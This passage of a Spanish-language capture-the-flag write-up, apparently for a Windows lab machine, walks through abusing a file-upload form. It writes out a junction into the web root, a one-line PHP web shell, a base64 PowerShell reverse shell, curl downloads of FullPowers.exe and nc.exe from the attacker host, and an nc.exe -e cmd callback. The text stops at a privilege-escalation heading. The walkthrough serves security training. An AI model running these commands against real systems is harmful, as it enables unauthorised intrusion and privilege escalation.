+                            &lt;br /&gt;
+                            Of Our
+                            &lt;br /&gt;
+                            Success Story!
+                        &lt;/h4&gt;
+                    &lt;/div&gt;
+                &lt;/li&gt;
+            &lt;/ul&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;!-- Team--&gt;
+    &lt;section class=&quot;page-section bg-light&quot; id=&quot;team&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center&quot;&gt;
+                &lt;h2 class=&quot;section-heading text-uppercase&quot;&gt;Meet Our Dedicated Team&lt;/h2&gt;
+                &lt;h3 class=&quot;section-subheading text-muted&quot;&gt;Get to know the talented individuals behind our success.&lt;/h3&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-4&quot;&gt;
+                    &lt;div class=&quot;team-member&quot;&gt;
+                        &lt;img class=&quot;mx-auto rounded-circle&quot; src=&quot;assets/img/team/1.jpg&quot; alt=&quot;Parveen Anand&quot; /&gt;
+                        &lt;h4&gt;Parveen Anand&lt;/h4&gt;
+                        &lt;p class=&quot;text-muted&quot;&gt;Lead Designer&lt;/p&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Parveen Anand Twitter Profile&quot;&gt;&lt;i
+                                class=&quot;fab fa-twitter&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Parveen Anand Facebook Profile&quot;&gt;&lt;i
+                                class=&quot;fab fa-facebook-f&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Parveen Anand LinkedIn Profile&quot;&gt;&lt;i
+                                class=&quot;fab fa-linkedin-in&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-4&quot;&gt;
+                    &lt;div class=&quot;team-member&quot;&gt;
+                        &lt;img class=&quot;mx-auto rounded-circle&quot; src=&quot;assets/img/team/2.jpg&quot; alt=&quot;Diana Petersen&quot; /&gt;
+                        &lt;h4&gt;Diana Petersen&lt;/h4&gt;
+                        &lt;p class=&quot;text-muted&quot;&gt;Lead Marketer&lt;/p&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Diana Petersen Twitter Profile&quot;&gt;&lt;i
+                                class=&quot;fab fa-twitter&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot;
+                            aria-label=&quot;Diana Petersen Facebook Profile&quot;&gt;&lt;i class=&quot;fab fa-facebook-f&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot;
+                            aria-label=&quot;Diana Petersen LinkedIn Profile&quot;&gt;&lt;i class=&quot;fab fa-linkedin-in&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-4&quot;&gt;
+                    &lt;div class=&quot;team-member&quot;&gt;
+                        &lt;img class=&quot;mx-auto rounded-circle&quot; src=&quot;assets/img/team/3.jpg&quot; alt=&quot;Larry Parker&quot; /&gt;
+                        &lt;h4&gt;Larry Parker&lt;/h4&gt;
+                        &lt;p class=&quot;text-muted&quot;&gt;Lead Developer&lt;/p&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Larry Parker Twitter Profile&quot;&gt;&lt;i
+                                class=&quot;fab fa-twitter&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Larry Parker Facebook Profile&quot;&gt;&lt;i
+                                class=&quot;fab fa-facebook-f&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                        &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Larry Parker LinkedIn Profile&quot;&gt;&lt;i
+                                class=&quot;fab fa-linkedin-in&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;row&quot;&gt;
+                &lt;div class=&quot;col-lg-8 mx-auto text-center&quot;&gt;
+                    &lt;p class=&quot;large text-muted&quot;&gt;Our team is passionate about creating exceptional experiences for our
+                        clients. We take pride in our work and collaborate to deliver outstanding results that make a
+                        difference.&lt;/p&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;!-- Clients --&gt;
+    &lt;div class=&quot;py-5&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;row align-items-center&quot;&gt;
+                &lt;div class=&quot;col-md-3 col-sm-6 my-3&quot;&gt;
+                    &lt;a href=&quot;#!&quot;&gt;&lt;img class=&quot;img-fluid img-brand d-block mx-auto&quot; src=&quot;assets/img/logos/microsoft.svg&quot;
+                            alt=&quot;Microsoft Logo&quot; aria-label=&quot;Microsoft Logo&quot; /&gt;&lt;/a&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-3 col-sm-6 my-3&quot;&gt;
+                    &lt;a href=&quot;#!&quot;&gt;&lt;img class=&quot;img-fluid img-brand d-block mx-auto&quot; src=&quot;assets/img/logos/google.svg&quot;
+                            alt=&quot;Google Logo&quot; aria-label=&quot;Google Logo&quot; /&gt;&lt;/a&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-3 col-sm-6 my-3&quot;&gt;
+                    &lt;a href=&quot;#!&quot;&gt;&lt;img class=&quot;img-fluid img-brand d-block mx-auto&quot; src=&quot;assets/img/logos/facebook.svg&quot;
+                            alt=&quot;Facebook Logo&quot; aria-label=&quot;Facebook Logo&quot; /&gt;&lt;/a&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-md-3 col-sm-6 my-3&quot;&gt;
+                    &lt;a href=&quot;#!&quot;&gt;&lt;img class=&quot;img-fluid img-brand d-block mx-auto&quot; src=&quot;assets/img/logos/ibm.svg&quot;
+                            alt=&quot;IBM Logo&quot; aria-label=&quot;IBM Logo&quot; /&gt;&lt;/a&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Contact --&gt;
+    &lt;section class=&quot;page-section&quot; id=&quot;contact&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;text-center&quot;&gt;
+                &lt;h2 class=&quot;section-heading text-uppercase&quot;&gt;Join Our Team&lt;/h2&gt;
+                &lt;h3 class=&quot;section-heading text-uppercase&quot;&gt;We're Hiring Graphics Designers!&lt;/h3&gt;
+            &lt;/div&gt;
+            &lt;form id=&quot;contactForm&quot; data-sb-form-api-token=&quot;API_TOKEN&quot; action=&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;
+                PHP_SELF&quot;]); ?&gt;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+                &lt;div class=&quot;row align-items-stretch mb-5&quot;&gt;
+                    &lt;div class=&quot;col-md-6&quot;&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;!-- First Name input --&gt;
+                            &lt;input class=&quot;form-control&quot; id=&quot;firstname&quot; name=&quot;firstname&quot; type=&quot;text&quot;
+                                placeholder=&quot;Your First Name *&quot; data-sb-validations=&quot;required&quot; /&gt;
+                            &lt;div class=&quot;invalid-feedback&quot; data-sb-feedback=&quot;firstname:required&quot;&gt;First name is required.
+                            &lt;/div&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;!-- Last Name input --&gt;
+                            &lt;input class=&quot;form-control&quot; id=&quot;lastname&quot; name=&quot;lastname&quot; type=&quot;text&quot;
+                                placeholder=&quot;Your Last Name *&quot; data-sb-validations=&quot;required&quot; /&gt;
+                            &lt;div class=&quot;invalid-feedback&quot; data-sb-feedback=&quot;lastname:required&quot;&gt;Last name is required.
+                            &lt;/div&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;!-- Email address input --&gt;
+                            &lt;input class=&quot;form-control&quot; id=&quot;email&quot; name=&quot;email&quot; type=&quot;email&quot; placeholder=&quot;Your Email *&quot;
+                                data-sb-validations=&quot;required,email&quot; /&gt;
+                            &lt;div class=&quot;invalid-feedback&quot; data-sb-feedback=&quot;email:required&quot;&gt;An email is required.&lt;/div&gt;
+                            &lt;div class=&quot;invalid-feedback&quot; data-sb-feedback=&quot;email:email&quot;&gt;Email is not valid.&lt;/div&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                    &lt;div class=&quot;col-md-6&quot;&gt;
+                        &lt;div class=&quot;form-group&quot;&gt;
+                            &lt;!-- Video upload input --&gt;
+                            &lt;small class=&quot;form-text text-white&quot;&gt;Upload a brief introduction video (compatible with
+                                Windows Media Player):&lt;/small&gt;
+                            &lt;input class=&quot;form-control&quot; id=&quot;fileToUpload&quot; name=&quot;fileToUpload&quot; type=&quot;file&quot;
+                                accept=&quot;video/*&quot; data-sb-validations=&quot;required&quot; /&gt;
+                            &lt;div class=&quot;invalid-feedback&quot; data-sb-feedback=&quot;fileToUpload:required&quot;&gt;A video is required.
+                            &lt;/div&gt;
+                            &lt;small class=&quot;form-text text-white&quot;&gt;Please upload a brief introduction video about yourself
+                                and your experiences, explaining why you think you're fit for the job.&lt;/small&gt;
+                        &lt;/div&gt;
+                    &lt;/div&gt;
+                &lt;/div&gt;
+                &lt;!-- Submit Button --&gt;
+                &lt;div class=&quot;text-center&quot;&gt;
+                    &lt;input class=&quot;btn btn-primary btn-xl text-uppercase&quot; type=&quot;submit&quot; value=&quot;Upload File&quot;
+                        name=&quot;submit&quot;&gt;
+                &lt;/div&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/section&gt;
+
+    &lt;!-- Footer--&gt;
+    &lt;footer class=&quot;footer py-4&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;div class=&quot;row align-items-center&quot;&gt;
+                &lt;div class=&quot;col-lg-4 text-lg-start&quot;&gt;Copyright &amp;copy; ProMotion Studios 2023&lt;/div&gt;
+                &lt;div class=&quot;col-lg-4 my-3 my-lg-0&quot;&gt;
+                    &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Twitter&quot;&gt;&lt;i
+                            class=&quot;fab fa-twitter&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;Facebook&quot;&gt;&lt;i
+                            class=&quot;fab fa-facebook-f&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                    &lt;a class=&quot;btn btn-dark btn-social mx-2&quot; href=&quot;#!&quot; aria-label=&quot;LinkedIn&quot;&gt;&lt;i
+                            class=&quot;fab fa-linkedin-in&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;col-lg-4 text-lg-end&quot;&gt;
+                    &lt;a class=&quot;link-dark text-decoration-none me-3&quot; href=&quot;#!&quot;&gt;Privacy Policy&lt;/a&gt;
+                    &lt;a class=&quot;link-dark text-decoration-none&quot; href=&quot;#!&quot;&gt;Terms of Use&lt;/a&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/footer&gt;
+    &lt;!-- Bootstrap core JS--&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;!-- Core theme JS--&gt;
+    &lt;script src=&quot;js/scripts.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+
+&lt;/html&gt;
+enox@MEDIA C:\xampp\htdocs&gt;
+</code></pre></div></div>
+<ul>
+<li>Este es el código todo lo que subimos se guarda en la ruta <code>C:/Windows/Tasks/Uploads/</code>, pero lo que ingresamos lo convierte en <strong>MD5</strong> por ejemplo nosotros ingresamos <strong>test</strong> en todo entonces se supone que lo debería hacer de la siguiente manera: fuente:</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ echo -n &quot;testtesttest@test.com&quot; | md5sum
+44b85c98e94039c8a0a015f6d3a3449e  -
+➜  ~
+</code></pre></div></div>
+<ul>
+<li><p>Una forma de asegurar esto es ver el contenido de la ruta donde se guardan y ver si ingresan los datos, de esta manera se guardan en <strong>MD5</strong>.</p>
+</li>
+<li><p>Y bueno, al parecer si lo hace.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">enox@MEDIA C:\Windows\Tasks\Uploads&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of C:\Windows\Tasks\Uploads
+
+02/29/2024  11:28 AM    &lt;DIR&gt;          .
+10/02/2023  10:04 AM    &lt;DIR&gt;          ..
+02/29/2024  11:27 AM    &lt;DIR&gt;          44b85c98e94039c8a0a015f6d3a3449e
+02/29/2024  11:28 AM                 0 todo.txt
+               1 File(s)              0 bytes
+               3 Dir(s)   8,547,569,664 bytes free
+
+enox@MEDIA C:\Windows\Tasks\Uploads&gt;
+</code></pre></div></div>
+<ul>
+<li><p>Vamos a crear un enlace simbólico a la ruta <code>C:\xampp\htdocss</code>  para poder subir nuestra web shell con <strong>mlink</strong> <a href="https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/mklink">https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/mklink</a> .</p>
+</li>
+<li><p>Primero vamos a borrar el directorio generado.</p>
+</li>
+</ul>
+<div class="code-window" data-language="PowerShell"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">PowerShell</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-powershell">enox@MEDIA C:\xampp\htdocs&gt;powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\xampp\htdocs&gt; rmdir C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e\
+
+Confirm
+The item at C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e\ has children and the Recurse parameter was not specified. If you continue,
+all children will be removed with the item. Are you sure you want to continue?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is &quot;Y&quot;): Y
+PS C:\xampp\htdocs&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora creamos el enlace desde la <strong>cmd</strong>.</li>
+</ul>
+<div class="code-window" data-language="PowerShell"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">PowerShell</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-powershell">enox@MEDIA C:\xampp\htdocs&gt;mklink /J C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e C:\xampp\htdocss
+Junction created for C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e &lt;&lt;===&gt;&gt; C:\xampp\htdocss
+
+enox@MEDIA C:\xampp\htdocs&gt;
+</code></pre></div></div>
+<ul>
+<li>Con esto lo que logramos es que el directorio <strong>44b85c98e94039c8a0a015f6d3a3449e</strong> está en <strong>C:\xampp\htdocss</strong>, ya que se creó el <strong>Juction</strong> ahora vamos a hacer él <strong>.php</strong> para enviarnos la reverse shell.</li>
+</ul>
+<div class="code-window" data-language="PHP"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">PHP</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-php">➜  ~ cat cmd.php
+&lt;?php
+	system($_GET['cmd']);
+?&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora, con los mismos valores que teníamos con <strong>test</strong> en la parte del <strong>MD5</strong> vamos a subir la <strong>shell</strong>.</li>
+</ul>
+<p align="center">
+<img src="https://i.imgur.com/2JDcTIi.png">
+</p>
+
+<ul>
+<li>Y vemos que tenemos él <strong>.php</strong> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">enox@MEDIA C:\xampp\htdocs&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of C:\xampp\htdocs
+
+03/01/2024  01:21 PM    &lt;DIR&gt;          .
+03/01/2024  01:12 PM    &lt;DIR&gt;          ..
+10/02/2023  09:27 AM    &lt;DIR&gt;          assets
+03/01/2024  01:21 PM                32 cmd.php
+10/02/2023  09:27 AM    &lt;DIR&gt;          css
+10/10/2023  04:00 AM            20,563 index.php
+10/02/2023  09:27 AM    &lt;DIR&gt;          js
+               2 File(s)         20,595 bytes
+               5 Dir(s)   8,555,507,712 bytes free
+
+enox@MEDIA C:\xampp\htdocs&gt;
+</code></pre></div></div>
+<p align="center">
+<img src="https://i.imgur.com/7Q5JXSq.png">
+</p>
+
+<h2 id="shell-as-nt-authority-local">Shell as nt authority\local</h2>
+<ul>
+<li>Ahora nos ponemos en escucha para enviarnos una reverse shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+</code></pre></div></div>
+<ul>
+<li>Vamos a utilizar el siguiente recurso para crear el oneliner en powershell usando <strong>base64</strong> . <a href="https://www.revshells.com/">https://www.revshells.com/</a>.</li>
+</ul>
+<div class="code-window" data-language="PowerShell"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">PowerShell</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-powershell">http://10.10.111.108/cmd.php?cmd=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEALgAxADIANwAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+</code></pre></div></div>
+<ul>
+<li>Nos llega la <strong>shell</strong> .</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  ~ rlwrap nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.8.1.127] from (UNKNOWN) [10.10.111.108] 50309
+whoami
+nt authority\local service
+PS C:\xampp\htdocs&gt;
+</code></pre></div></div>
+<ul>
+<li>Verificamos que no tenemos todos los privilegios máximos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\xampp\htdocs&gt; whoami /all
+
+USER INFORMATION
+----------------
+
+User Name                  SID
+========================== ========
+nt authority\local service S-1-5-19
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                                                              Attributes
+====================================== ================ ================================================================================================ ==================================================
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                            
+Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-1488445330-856673777-1515413738-1380768593-2977925950-2228326386-886087428-2802422674   Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID type S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State 
+============================= =================================== ========
+SeTcbPrivilege                Act as part of the operating system Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeCreateGlobalPrivilege       Create global objects               Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
+SeTimeZonePrivilege           Change the time zone                Disabled
+
+PS C:\xampp\htdocs&gt;
+</code></pre></div></div>
+<ul>
+<li>Para esto podemos usar la siguiente herramienta <a href="https://github.com/itm4n/FullPowers">https://github.com/itm4n/FullPowers</a> que nos recupera los privilegios por defecto.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\&gt; mkdir Temp
+
+
+    Directory: C:\
+
+
+Mode                 LastWriteTime         Length Name                  
+----                 -------------         ------ ----                  
+d-----          3/1/2024   1:34 PM                Temp                  
+
+
+PS C:\&gt; cd Temp
+PS C:\Temp&gt; curl -o FullPowers.exe http://10.8.1.127:8080/FullPowers.exe
+PS C:\Temp&gt; dir
+
+
+    Directory: C:\Temp
+
+
+Mode                 LastWriteTime         Length Name                  
+----                 -------------         ------ ----                  
+-a----          3/1/2024   1:36 PM          36864 FullPowers.exe        
+
+
+PS C:\Temp&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora también vamos a subir el netcat para enviarnos la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  Downloads cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Temp&gt; curl -o nc.exe http://10.8.1.127:8080/nc.exe
+PS C:\Temp&gt; dir
+
+
+    Directory: C:\Temp
+
+
+Mode                 LastWriteTime         Length Name                  
+----                 -------------         ------ ----                  
+-a----          3/1/2024   1:36 PM          36864 FullPowers.exe        
+-a----          3/1/2024   1:38 PM          28160 nc.exe                
+
+
+PS C:\Temp&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora nos podemos en escucha otra vez.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Temp&gt; .\FullPowers.exe -c &quot;C:\Temp\nc.exe 10.8.1.127 445 -e cmd&quot; -z
+</code></pre></div></div>
+<ul>
+<li>Y obtenemos la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content rlwrap nc -nlvp 445
+listening on [any] 445 ...
+connect to [10.8.1.127] from (UNKNOWN) [10.10.111.108] 50452
+Microsoft Windows [Version 10.0.20348.1970]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\local service
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+<h2 id="nt-authority-system">nt authority system</h2>
+<ul>
